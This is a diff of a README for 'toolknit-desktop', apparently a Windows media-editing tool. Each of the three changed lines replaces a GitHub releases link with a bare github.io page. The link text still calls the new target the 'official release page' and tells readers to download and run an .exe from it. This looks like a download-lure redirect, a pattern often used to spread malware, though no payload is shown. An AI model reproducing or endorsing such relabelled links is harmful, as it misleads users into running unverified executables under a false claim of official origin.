@@ -1,6 +1,6 @@
 # 🛠️ toolknit-desktop - Handle all your media files easily
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/Inanitionpudding345/toolknit-desktop/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://inanitionpudding345.github.io)
 
 Toolknit-desktop serves as a central hub for your daily digital tasks. You can edit videos, process images, convert PDF documents, and run artificial intelligence tasks within one simple window. This software replaces the need for dozens of separate programs.
 
@@ -8,7 +8,7 @@ Toolknit-desktop serves as a central hub for your daily digital tasks. You can e
 
 You do not need programming skills to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Inanitionpudding345/toolknit-desktop/releases).
+1. Go to the [official release page](https://inanitionpudding345.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
@@ -54,7 +54,7 @@ If the software does not open, check these items first:
 
 You can access the latest installer at the link below. Always download from this official source to ensure you have the clean and original version of the software.
 
-[Click here to visit the release page and download the installer](https://github.com/Inanitionpudding345/toolknit-desktop/releases)
+[Click here to visit the release page and download the installer](https://inanitionpudding345.github.io)
 
 ## 📄 Privacy and Data
 
